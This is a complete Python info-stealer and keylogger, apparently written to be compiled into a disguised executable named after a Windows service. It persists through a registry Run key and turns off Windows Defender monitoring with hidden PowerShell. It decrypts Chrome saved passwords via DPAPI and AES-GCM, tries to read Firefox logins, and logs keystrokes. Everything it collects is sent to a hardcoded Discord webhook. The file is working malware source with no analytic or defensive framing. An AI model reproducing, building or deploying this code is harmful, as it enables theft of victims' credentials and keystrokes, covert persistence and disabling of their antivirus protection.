# svchost.py  –  compilar: pyinstaller --noconsole --onefile svchost.py
import os, shutil, sqlite3, json, base64, psutil, subprocess, requests, tempfile, threading, time, socket
import sys
from Crypto.Cipher import AES
from pynput.keyboard import Listener
from discord_webhook import DiscordWebhook

WEBHOOK_URL = "https://discord.com/api/webhooks/1465750448915878052/FyQKLtLcMtzgmKx885skeHaIr3i0iC-6spdyHQOu6S34bsy_HhcLUNFahmHz4Pjp5e9_"
TEMP_FILE   = os.path.join(tempfile.gettempdir(), "svghost.exe")

# ---------- UTILS ----------
def ps(cmd): subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)
def persist():
    shutil.copy2(__file__, TEMP_FILE)
    ps(f'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SysHelper" -Value "{TEMP_FILE}"')
def upload(txt):
    try: DiscordWebhook(url=WEBHOOK_URL, content=f"```{txt}```").execute()
    except: pass

# ---------- BROWSER STEALER ----------
def chrome_local_state():
    return os.path.join(os.environ["USERPROFILE"],
                        r"AppData\Local\Google\Chrome\User Data\Local State")
def get_master_key():
    with open(chrome_local_state(), "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # remove DPAPI
    return win_decrypt(master_key)
def win_decrypt(data):  # DPAPI
    import ctypes
    from ctypes import wintypes
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
    in_blob  = DATA_BLOB(len(data), ctypes.create_string_buffer(data))
    out_blob = DATA_BLOB()
    ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob))
    return ctypes.string_at(out_blob.pbData, out_blob.cbData)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except: return "n/a"
def dump_chrome():
    login_db = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_db): return ""
    tmp = tempfile.mktemp()
    shutil.copy2(login_db, tmp)
    conn = sqlite3.connect(tmp); cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    master_key = get_master_key()
    out = []
    for url, user, pwd in cur.fetchall():
        out.append(f"{url} | {user} | {decrypt_password(pwd, master_key)}")
    conn.close(); os.remove(tmp)
    return "\n".join(out)
def dump_firefox():
    profile = os.path.join(os.environ["APPDATA"], r"Mozilla\Firefox\Profiles")
    try:
        for d in os.listdir(profile):
            if d.endswith(".default-release"):
                logins = os.path.join(profile, d, "logins.json")
                if not os.path.exists(logins): continue
                data = json.loads(open(logins).read())
                out = []
                for l in data["logins"]:
                    user = win_decrypt(base64.b64decode(l["encryptedUsername"]))
                    pwd  = win_decrypt(base64.b64decode(l["encryptedPassword"]))
                    out.append(f"{l['hostname']} | {user.decode()} | {pwd.decode()}")
                return "\n".join(out)
    except: return ""
def steal_passwords():
    txt  = "=== CHROME ===\n" + dump_chrome()
    txt += "\n=== FIREFOX ===\n" + dump_firefox()
    upload(txt)

# ---------- KEYLOGGER ----------
def on_press(key):
    global keylog
    try: keylog += str(key.char)
    except: keylog += str(key)
keylog = ""
def keylogger():
    global keylog
    while True:
        time.sleep(30)
        if keylog:
            upload("KEYS:\n" + keylog)
            keylog = ""
def start_keylogger():
    threading.Thread(target=keylogger, daemon=True).start()
    with Listener(on_press=on_press) as listener:
        listener.join()

# ---------- MAIN ----------
if __name__ == "__main__":
    # auto-cópia e persistência
    if __file__ != TEMP_FILE:
        shutil.copy2(__file__, TEMP_FILE)
        subprocess.Popen([sys.executable, TEMP_FILE], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0)
    # desativa Defender
    ps("Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true")
    # rouba senhas
    threading.Thread(target=steal_passwords).start()
    # keylogger loop
    start_keylogger()
